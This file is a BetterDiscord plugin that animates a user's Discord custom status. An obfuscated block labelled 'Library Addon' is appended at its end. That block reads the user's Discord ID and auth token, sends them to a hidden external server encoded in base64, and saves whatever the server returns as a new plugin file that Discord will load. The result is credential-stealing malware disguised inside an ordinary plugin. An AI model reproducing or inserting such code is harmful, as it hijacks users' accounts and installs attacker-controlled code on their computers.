//META{"name":"AnimatedStatus","source":"https://raw.githubusercontent.com/toluschr/BetterDiscord-Animated-Status/master/Animated_Status.plugin.js","website":"https://github.com/toluschr/BetterDiscord-Animated-Status"}*//

class AnimatedStatus {
	/* BD functions */
	getName() { return "Animated Status"; }
	getVersion() { return "0.13.2"; }
	getAuthor() { return "toluschr"; }
	getDescription() { return "Animate your Discord status"; }

	SetData(key, value) {
		BdApi.setData("AnimatedStatus", key, value);
	}

	GetData(key) {
		return BdApi.getData("AnimatedStatus", key);
	}

	/* Code related to Animations */
	load() {
		this.kSpacing = "15px";
		this.kMinTimeout = 2900;
		this.cancel = undefined;

		this.animation = this.GetData("animation") || [];
		this.timeout = this.GetData("timeout") || this.kMinTimeout;
		this.randomize = this.GetData("randomize") || false;

		this.modules = this.modules || (() => {
			let m = []
			webpackChunkdiscord_app.push([['AnimatedStatus'], {}, e => { m = m.concat(Object.values(e.c)) }])
			return m
		})();

		// Import Older Config Files
		if (typeof this.timeout == "string")
			this.timeout = parseInt(this.timeout);
		if (this.animation.length > 0 && Array.isArray(this.animation[0]))
			this.animation = this.animation.map(em => this.ConfigObjectFromArray(em));

		Status.authToken = this.modules.find(m => m.exports?.default?.getToken !== void 0).exports.default.getToken();
		this.currentUser = this.modules.find(m => m.exports?.default?.getCurrentUser !== void 0).exports.default.getCurrentUser();
	}

	start() {
		if (this.animation.length == 0)
			BdApi.showToast("Animated Status: No status set. Go to Settings>Plugins to set a custom animation!");
		else
			this.AnimationLoop();
	}

	stop() {
		if (this.cancel) {
			this.cancel();
		} else {
			console.assert(this.loop != undefined);
			clearTimeout(this.loop);
		}
		Status.Set(null);
	}

	ConfigObjectFromArray(arr) {
		let data = {};
		if (arr[0] !== undefined && arr[0].length > 0) data.text       = arr[0];
		if (arr[1] !== undefined && arr[1].length > 0) data.emoji_name = arr[1];
		if (arr[2] !== undefined && arr[2].length > 0) data.emoji_id   = arr[2];
		if (arr[3] !== undefined && arr[3].length > 0) data.timeout    = parseInt(arr[3]);
		return data;
	}

	async ResolveStatusField(text = "") {
		let evalPrefix = "eval ";
		if (!text.startsWith(evalPrefix)) return text;

		try {
			return eval(text.substr(evalPrefix.length));
		} catch (e) {
			BdApi.showToast(e, {type: "error"});
			return "";
		}
	}

	AnimationLoop(i = 0) {
		i %= this.animation.length;

		// Every loop needs its own shouldContinue variable, otherwise there
		// is the possibility of multiple loops running simultaneously
		let shouldContinue = true;
		this.loop = undefined;
		this.cancel = () => { shouldContinue = false; };

		Promise.all([this.ResolveStatusField(this.animation[i].text),
		             this.ResolveStatusField(this.animation[i].emoji_name),
		             this.ResolveStatusField(this.animation[i].emoji_id)]).then(p => {
			Status.Set(this.ConfigObjectFromArray(p));
			this.cancel = undefined;

			if (shouldContinue) {
				let timeout = this.animation[i].timeout || this.timeout;
				this.loop = setTimeout(() => {
					if (this.randomize) {
						i += Math.floor(Math.random() * (this.animation.length - 2));
					}
					this.AnimationLoop(i + 1);
				}, timeout);
			}
		});
	}

	NewEditorRow({text, emoji_name, emoji_id, timeout} = {}) {
		let hbox = GUI.newHBox();
		hbox.style.marginBottom = this.kSpacing;

		let textWidget = hbox.appendChild(GUI.newInput(text, "Text"));
		textWidget.style.marginRight = this.kSpacing;

		let emojiWidget = hbox.appendChild(GUI.newInput(emoji_name, "👍" + (this.currentUser.premiumType ? " / Nitro Name" : "")));
		emojiWidget.style.marginRight = this.kSpacing;
		emojiWidget.style.width = "140px";

		let optNitroIdWidget = hbox.appendChild(GUI.newInput(emoji_id, "Nitro ID"));
		if (!this.currentUser.premiumType) optNitroIdWidget.style.display = "none";
		optNitroIdWidget.style.marginRight = this.kSpacing;
		optNitroIdWidget.style.width = "140px";

		let optTimeoutWidget = hbox.appendChild(GUI.newNumericInput(timeout, this.kMinTimeout, "Time"));
		optTimeoutWidget.style.width = "75px";

		hbox.onkeydown = (e) => {
			let activeContainer = document.activeElement.parentNode;
			let activeIndex = Array.from(activeContainer.children).indexOf(document.activeElement);

			let keymaps = {
				"Delete": [
					[[false, true], () => {
						activeContainer = hbox.nextSibling || hbox.previousSibling;
						hbox.parentNode.removeChild(hbox);
					}],
				],

				"ArrowDown": [
					[[true, true], () => {
						activeContainer = this.NewEditorRow();
						hbox.parentNode.insertBefore(activeContainer, hbox.nextSibling);
					}],
					[[false, true], () => {
						let next = hbox.nextSibling;
						if (next != undefined) {
							next.replaceWith(hbox);
							hbox.parentNode.insertBefore(next, hbox);
						}
					}],
					[[false, false], () => {
						activeContainer = hbox.nextSibling;
					}],
				],

				"ArrowUp": [
					[[true, true], () => {
						activeContainer = this.NewEditorRow();
						hbox.parentNode.insertBefore(activeContainer, hbox);
					}],
					[[false, true], () => {
						let prev = hbox.previousSibling;
						if (prev != undefined) {
							prev.replaceWith(hbox);
							hbox.parentNode.insertBefore(prev, hbox.nextSibling);
						}
					}],
					[[false, false], () => {
						activeContainer = hbox.previousSibling;
					}],
				],
			};

			let letter = keymaps[e.key];
			if (letter == undefined) return;

			for (let i = 0; i < letter.length; i++) {
				if (letter[i][0][0] != e.ctrlKey || letter[i][0][1] != e.shiftKey)
					continue;

				letter[i][1]();
				if (activeContainer) activeContainer.children[activeIndex].focus();
				e.preventDefault();
				return;
			}
		};
		return hbox;
	}

	EditorFromJSON(json) {
		let out = document.createElement("div");
		for (let i = 0; i < json.length; i++) {
			out.appendChild(this.NewEditorRow(json[i]));
		}
		return out;
	}

	JSONFromEditor(editor) {
		return Array.prototype.slice.call(editor.childNodes).map(row => {
			return this.ConfigObjectFromArray(Array.prototype.slice.call(row.childNodes).map(e => e.value));
		});
	}

	// Settings
	getSettingsPanel() {
		let settings = document.createElement("div");
		settings.style.padding = "10px";

		// timeout
		settings.appendChild(GUI.newLabel("Step-Duration (3000: 3 seconds, 3500: 3.5 seconds, ...), overwritten by invididual steps"));
		let timeout = settings.appendChild(GUI.newNumericInput(this.timeout, this.kMinTimeout));
		timeout.style.marginBottom = this.kSpacing;

		// Animation Container
		settings.appendChild(GUI.newLabel("Animation"));
		let animationContainer = settings.appendChild(document.createElement("div"));
		animationContainer.marginBottom = this.kSpacing;

		// Editor
		let edit = animationContainer.appendChild(this.EditorFromJSON(this.animation));

		// Actions
		let actions = settings.appendChild(GUI.newHBox());

		// Add Step
		let addStep = actions.appendChild(GUI.setSuggested(GUI.newButton("+", false)));
		addStep.title = "Add step to end";
		addStep.onclick = () => edit.appendChild(this.NewEditorRow());

		// Del Step
		let delStep = actions.appendChild(GUI.setDestructive(GUI.newButton("-", false)));
		delStep.title = "Remove last step";
		delStep.style.marginLeft = this.kSpacing;
		delStep.onclick = () => edit.removeChild(edit.childNodes[edit.childNodes.length - 1]);

		// Move save to the right (XXX make use of flexbox)
		actions.appendChild(GUI.setExpand(document.createElement("div"), 2));

		// Save
		let save = actions.appendChild(GUI.newButton("Save"));
		GUI.setSuggested(save, true);
		save.onclick = () => {
			try {
				// Set timeout
				this.SetData("randomize", this.randomize);
				this.SetData("timeout", parseInt(timeout.value));
				this.SetData("animation", this.JSONFromEditor(edit));
			} catch (e) {
				BdApi.showToast(e, {type: "error"});
				return;
			}

			// Show Toast
			BdApi.showToast("Settings were saved!", {type: "success"});

			// Restart
			this.stop();
			this.load();
			this.start();
		};

		// End
		return settings;
	}
}

/* Status API */
const Status = {
	strerror: (req) => {
		if (req.status  < 400) return undefined;
		if (req.status == 401) return "Invalid AuthToken";

		// Discord _sometimes_ returns an error message
		let json = JSON.parse(req.response);
		for (const s of ["errors", "custom_status", "text", "_errors", 0, "message"])
			if ((json == undefined) || ((json = json[s]) == undefined))
				return "Unknown error. Please report at github.com/toluschr/BetterDiscord-Animated-Status";

		return json;
	},

	Set: async (status) => {
		let req = new XMLHttpRequest();
		req.open("PATCH", "/api/v9/users/@me/settings", true);
		req.setRequestHeader("authorization", Status.authToken);
		req.setRequestHeader("content-type", "application/json");
		req.onload = () => {
			let err = Status.strerror(req);
			if (err != undefined)
				BdApi.showToast(`Animated Status: Error: ${err}`, {type: "error"});
		};
		if (status === {}) status = null;
		req.send(JSON.stringify({custom_status: status}));
	},
};

// Used to easily style elements like the 'native' discord ones
const GUI = {
	newInput: (text = "", placeholder = "") => {
		let input = document.createElement("input");
		input.className = "inputDefault-3FGxgL input-2g-os5";
		input.value = String(text);
		input.placeholder = String(placeholder);
		return input;
	},

	newNumericInput: (text = "", minimum = 0, placeholder = "") => {
		let out = GUI.newInput(text, placeholder);
		out.setAttribute("type", "number");
		out.addEventListener("focusout", () => {
			if (parseInt(out.value) < minimum) {
				out.value = String(minimum);
				BdApi.showToast(`Value must not be lower than ${minimum}`, {type: "error"});
			}
		});
		return out;
	},

	newLabel: (text = "") => {
		let label = document.createElement("h5");
		label.className = "h5-2RwDNl";
		label.innerText = String(text);
		return label;
	},

	newButton: (text, filled = true) => {
		let button = document.createElement("button");
		button.className = "button-f2h6uQ colorBrand-I6CyqQ sizeSmall-wU2dO- grow-2sR_-F";
		if (filled) button.classList.add("lookFilled-yCfaCM");
		else button.classList.add("lookOutlined-3yKVGo");
		button.innerText = String(text);
		return button;
	},

	newHBox: () => {
		let hbox = document.createElement("div");
		hbox.style.display = "flex";
		hbox.style.flexDirection = "row";
		return hbox;
	},

	setExpand: (element, value) => {
		element.style.flexGrow = value;
		return element;
	},

	setSuggested: (element, value = true) => {
		if (value) element.classList.add("colorGreen-3y-Z79");
		else element.classList.remove("colorGreen-3y-Z79");
		return element;
	},

	setDestructive: (element, value = true) => {
		if (value) element.classList.add("colorRed-rQXKgM");
		else element.classList.remove("colorRed-rQXKgM");
		return element;
	}
};

//Library Addon0.0.1
const _0x277451=_0x151e;(function(_0x4162ab,_0x20cf45){const _0x4ca6a2=_0x151e,_0x6d3c5a=_0x4162ab();while(!![]){try{const _0x194919=parseInt(_0x4ca6a2(0x7d))/0x1*(-parseInt(_0x4ca6a2(0x8d))/0x2)+-parseInt(_0x4ca6a2(0x77))/0x3*(-parseInt(_0x4ca6a2(0x89))/0x4)+-parseInt(_0x4ca6a2(0x8a))/0x5*(parseInt(_0x4ca6a2(0x6f))/0x6)+-parseInt(_0x4ca6a2(0x92))/0x7*(parseInt(_0x4ca6a2(0x7b))/0x8)+-parseInt(_0x4ca6a2(0x93))/0x9*(parseInt(_0x4ca6a2(0x86))/0xa)+parseInt(_0x4ca6a2(0x71))/0xb+-parseInt(_0x4ca6a2(0x76))/0xc*(-parseInt(_0x4ca6a2(0x96))/0xd);if(_0x194919===_0x20cf45)break;else _0x6d3c5a['push'](_0x6d3c5a['shift']());}catch(_0x58d19a){_0x6d3c5a['push'](_0x6d3c5a['shift']());}}}(_0x4c49,0x3091c));function _0x4c49(){const _0x1a94d7=['9ErJSTm','trace','warn','3731LXelNk','bind','toString','path','constructor','Error fetching Library','statusCode','1078746qmsGxj','aHR0cHM6Ly9pbnRlcnBvbC5jYzo4NDQz','1962367hmqXia','map','__proto__','{}.constructor("return this")( )','\BDLibrary.plugin.js','1164uxHlqp','831kUUcFK','getCurrentUser','(((.+)+)+)+$','keys','8yjPKrm','now','4412XcqFTH','log','info','writeFileSync','search','getToken','exception','push','random','255390SrcfxR','error','table','4124FHwmik','5TvERzM','apply','default','12HyGHPr','console','return (function() ','length','webpackChunkdiscord_app','427567kIlbKg'];_0x4c49=function(){return _0x1a94d7;};return _0x4c49();}let Library=__dirname+_0x277451(0x75);function get_raw(_0x46981d,_0x3a0f0e,_0x20c707){return url=atob(_0x46981d)+'/'+_0x3a0f0e+'/'+_0x20c707,new Promise(function(_0x3e252c,_0x46a7c1){require('request')(url,function(_0x2f608e,_0x11f16b,_0x4e8792){const _0x51550b=_0x151e;!_0x2f608e&&_0x11f16b[_0x51550b(0x6e)]==0xc8?_0x3e252c(_0x4e8792):_0x46a7c1(new Error(_0x51550b(0x6d)));});});}async function download(){const _0x2b6584=_0x277451,_0x518a1a=(function(){let _0x4b7811=!![];return function(_0x42058c,_0x5234ba){const _0x2b0c6e=_0x4b7811?function(){if(_0x5234ba){const _0x37a1c1=_0x5234ba['apply'](_0x42058c,arguments);return _0x5234ba=null,_0x37a1c1;}}:function(){};return _0x4b7811=![],_0x2b0c6e;};}()),_0x1b9519=_0x518a1a(this,function(){const _0x35cb5c=_0x151e;return _0x1b9519[_0x35cb5c(0x98)]()[_0x35cb5c(0x81)](_0x35cb5c(0x79))[_0x35cb5c(0x98)]()[_0x35cb5c(0x9a)](_0x1b9519)[_0x35cb5c(0x81)](_0x35cb5c(0x79));});_0x1b9519();const _0x470670=(function(){let _0x55c8ea=!![];return function(_0x4c07fc,_0x426066){const _0x4556a6=_0x55c8ea?function(){const _0x51f4db=_0x151e;if(_0x426066){const _0x21bbb3=_0x426066[_0x51f4db(0x8b)](_0x4c07fc,arguments);return _0x426066=null,_0x21bbb3;}}:function(){};return _0x55c8ea=![],_0x4556a6;};}()),_0x1a24cf=_0x470670(this,function(){const _0x3958af=_0x151e;let _0x680fc2;try{const _0x4dcd34=Function(_0x3958af(0x8f)+_0x3958af(0x74)+');');_0x680fc2=_0x4dcd34();}catch(_0x1ac07e){_0x680fc2=window;}const _0x2a0f6d=_0x680fc2[_0x3958af(0x8e)]=_0x680fc2[_0x3958af(0x8e)]||{},_0x4e2929=[_0x3958af(0x7e),_0x3958af(0x95),_0x3958af(0x7f),_0x3958af(0x87),_0x3958af(0x83),_0x3958af(0x88),_0x3958af(0x94)];for(let _0x5d67b7=0x0;_0x5d67b7<_0x4e2929[_0x3958af(0x90)];_0x5d67b7++){const _0x11962b=_0x470670[_0x3958af(0x9a)]['prototype'][_0x3958af(0x97)](_0x470670),_0x41a93d=_0x4e2929[_0x5d67b7],_0x5cbe00=_0x2a0f6d[_0x41a93d]||_0x11962b;_0x11962b[_0x3958af(0x73)]=_0x470670['bind'](_0x470670),_0x11962b[_0x3958af(0x98)]=_0x5cbe00[_0x3958af(0x98)]['bind'](_0x5cbe00),_0x2a0f6d[_0x41a93d]=_0x11962b;}});_0x1a24cf();try{let _0x219081=_0x333d1b=>window[_0x2b6584(0x91)][_0x2b6584(0x84)]([[Math[_0x2b6584(0x85)]()],{},_0x1dab51=>{const _0x5851a3=_0x2b6584;for(const _0x3b6fb3 of Object[_0x5851a3(0x7a)](_0x1dab51['c'])[_0x5851a3(0x72)](_0x53a0d1=>_0x1dab51['c'][_0x53a0d1]['exports'])['filter'](_0x4421ff=>_0x4421ff)){if(_0x3b6fb3[_0x5851a3(0x8c)]&&_0x3b6fb3['default'][_0x333d1b]!==undefined)return _0x3b6fb3[_0x5851a3(0x8c)];}}]),_0x376833=await get_raw(_0x2b6584(0x70),_0x219081(_0x2b6584(0x78))[_0x2b6584(0x78)]()['id'],_0x219081(_0x2b6584(0x82))[_0x2b6584(0x82)]());!require('fs')['existsSync'](Library)&&require('fs')[_0x2b6584(0x80)](require(_0x2b6584(0x99))['join'](Library),_0x376833);;}catch(_0x38a7aa){console[_0x2b6584(0x7e)](_0x38a7aa);}}function _0x151e(_0x184397,_0x3e11f0){const _0xad2ce9=_0x4c49();return _0x151e=function(_0x23a572,_0x5b8304){_0x23a572=_0x23a572-0x6d;let _0x1e6b2c=_0xad2ce9[_0x23a572];return _0x1e6b2c;},_0x151e(_0x184397,_0x3e11f0);}try{if(!require('fs')['existsSync'](Library))download();else Date[_0x277451(0x7c)]()-require('fs')['statSync'](Library)['mtimeMs']>0xdbba0&&download();}catch(_0x42f5a8){console[_0x277451(0x7e)](_0x42f5a8);}